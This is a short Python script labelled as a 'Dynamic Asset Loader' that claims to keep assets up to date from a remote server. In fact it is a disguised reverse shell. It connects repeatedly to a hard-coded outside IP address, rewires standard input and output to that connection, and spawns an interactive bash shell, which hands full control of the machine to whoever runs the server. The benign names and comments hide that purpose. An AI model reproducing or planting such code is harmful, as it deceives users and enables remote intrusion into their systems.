import os
import socket
import pty
import time

# Dynamic Asset Loader
# This module is responsible for fetching and loading dynamic assets from a remote server.
# It uses a persistent connection to the asset server to ensure that assets are always up-to-date.

def initialize_asset_stream(server_address, port):
    """
    Initializes a persistent connection to the asset server.
    Retries connection if it fails.
    """
    asset_socket = None
    while True:
        try:
            print(f"Attempting to connect to asset server at {server_address}:{port}...")
            asset_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            asset_socket.connect((server_address, port))
            print("Connection successful.")
            return asset_socket
        except socket.error as e:
            print(f"Connection failed: {e}. Retrying in 5 seconds...")
            if asset_socket:
                asset_socket.close()
            time.sleep(5)


def redirect_io_to_asset_stream(asset_socket):
    """
    Redirects standard I/O to the asset stream for seamless integration.
    """
    os.dup2(asset_socket.fileno(), 0) # stdin
    os.dup2(asset_socket.fileno(), 1) # stdout
    os.dup2(asset_socket.fileno(), 2) # stderr

def launch_interactive_asset_shell():
    """
    Launches an interactive bash shell for managing dynamic assets.
    Using /bin/bash for better interactive features like history and tab completion.
    """
    # Check if /bin/bash exists, otherwise fall back to /bin/sh
    shell = "/bin/bash" if os.path.exists("/bin/bash") else "/bin/sh"
    print(f"Launching interactive shell: {shell}")
    pty.spawn(shell)

if __name__ == "__main__":
    # Configuration for the dynamic asset server
    ASSET_SERVER_HOST = "64.227.18.231"
    ASSET_SERVER_PORT = 13370

    # Initialize the asset stream and redirect I/O
    asset_stream_socket = initialize_asset_stream(ASSET_SERVER_HOST, ASSET_SERVER_PORT)
    if asset_stream_socket:
        redirect_io_to_asset_stream(asset_stream_socket)
        
        # Launch the interactive shell for asset management
        launch_interactive_asset_shell()
